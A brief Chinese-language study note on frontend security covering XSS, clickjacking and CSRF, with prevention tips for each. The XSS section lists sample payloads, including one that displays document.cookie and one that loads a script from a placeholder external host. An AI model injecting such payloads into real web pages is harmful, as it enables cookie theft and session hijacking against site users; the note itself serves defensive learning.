# 前端涉及到的安全

## XSS

> 跨站脚本注入攻击，通过向web插入Script脚本代码，当用户浏览界面时候，嵌入的脚本就会执行攻击用户。目前主要分为存储型、反射型、DOM型
```
<svg onload="alert(1)">
<script>alert(document.cookie)</script>      #弹出cookie
<script src=http://xxx.com/xss.js></script>  #引用外部的xss
```
### 预防
* 输入验证过滤
* 设置httpOnly
* 进行特殊转义
* 设置http头部 XSS-Protection


## 点击劫持
> 利用透明的覆盖层或者iframe来欺骗用户在不知情的情况下点击类似无害的按钮


### 预防
* HTTP X-Frame-Options 响应头设置DENY
* 代码里边判断是否界面在iframe中

## CSRF
> 伪造请求来利用互用已验证的状态喜爱发出非预期请求，可能进行支付、密码修改、删除数据

### 预防
* 提交使用SCRF Token
* 验证Referer头部
* 避免自动登录记住密码